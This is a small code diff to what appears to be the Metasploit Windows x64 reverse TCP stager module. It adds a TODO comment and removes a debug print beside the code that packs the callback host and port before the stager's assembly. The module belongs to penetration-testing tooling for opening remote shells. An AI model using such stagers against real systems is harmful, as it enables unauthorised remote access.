@@ -29,6 +29,7 @@ module Payload::Windows::ReverseTcp_x64
   # Generate the first stage
   #
   def generate
+    # TODO: coming later
     # Generate the simple version of this stager if we don't have enough space
     #if self.available_space.nil? || required_space > self.available_space
     #  return generate_reverse_tcp(
@@ -96,7 +97,6 @@ module Payload::Windows::ReverseTcp_x64
     encoded_port = [opts[:port].to_i,2].pack("vn").unpack("N").first
     encoded_host = Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
     encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
-    STDERR.puts("#{encoded_host_port}\n")
 
     asm = %Q^
       reverse_tcp:
